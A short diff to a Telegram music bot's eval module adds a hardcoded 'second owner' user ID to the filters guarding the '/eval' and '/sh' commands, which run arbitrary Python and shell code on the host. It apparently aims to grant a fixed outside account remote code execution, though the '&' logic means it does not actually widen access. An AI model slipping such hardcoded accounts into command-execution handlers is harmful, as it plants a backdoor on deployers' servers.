@@ -13,6 +13,13 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 from AviaxMusic import app
 from config import OWNER_ID
 
+SECOND_OWNER_ID = 6848223695  # Replace with the actual second owner ID
+ALLOWED_ADMINS = [OWNER_ID, SECOND_OWNER_ID]
+
+
+# Custom filter for allowed sudo command users
+sudo_admin_filter = filters.user(ALLOWED_ADMINS)
+
 
 async def aexec(code, client, message):
     exec(
@@ -37,6 +44,7 @@ async def edit_or_reply(msg: Message, **kwargs):
 @app.on_message(
     filters.command("eval")
     & filters.user(OWNER_ID)
+    & sudo_admin_filter
     & ~filters.forwarded
     & ~filters.via_bot
 )
@@ -147,6 +155,7 @@ async def forceclose_command(_, CallbackQuery):
 @app.on_message(
     filters.command("sh")
     & filters.user(OWNER_ID)
+    &  sudo_admin_filter
     & ~filters.forwarded
     & ~filters.via_bot
 )
